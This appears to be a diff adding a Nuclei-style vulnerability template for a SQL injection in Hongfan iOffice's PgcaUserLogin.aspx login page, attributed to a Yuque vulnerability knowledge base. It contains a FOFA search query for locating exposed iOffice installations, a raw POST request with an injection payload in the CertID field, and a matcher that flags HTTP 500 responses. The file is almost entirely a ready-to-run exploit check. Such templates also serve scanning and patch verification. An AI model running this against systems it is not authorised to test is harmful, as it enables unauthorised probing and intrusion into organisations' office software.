@@ -1,0 +1,26 @@
+id: poc-rg4n74afaocdgzt6
+info:
+  name: 红帆ioffice PgcaUserLogin.aspx 存在SQL 注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rg4n74afaocdgzt6'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: rg4n74afaocdgzt6
+    fofa: (title="iOffice.net" || body="/iOffice/js" || (body="iOffice.net" && header!="couchdb" && header!="drupal") || body="iOfficeOcxSetup.exe" || body="Hongfan. All Rights Reserved")
+http:
+- raw:
+  - 'POST /ioffice/Identity/PgcaUserLogin.aspx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    __EVENTTARGET=btVerify&__EVENTARGUMENT=&__VIEWSTATE=YOUR___VIEWSTATE&__VIEWSTATEGENERATOR=YOUR___VIEWSTATEGENERATOR&btVerify=&CertID=''-1/user--+-&lblSerialNum=SQLI_POC&txthidIsLogin=1&UserPIN=123456'
+  redirects: false
+  matchers:
+  - status:
+    - 500
+    type: status
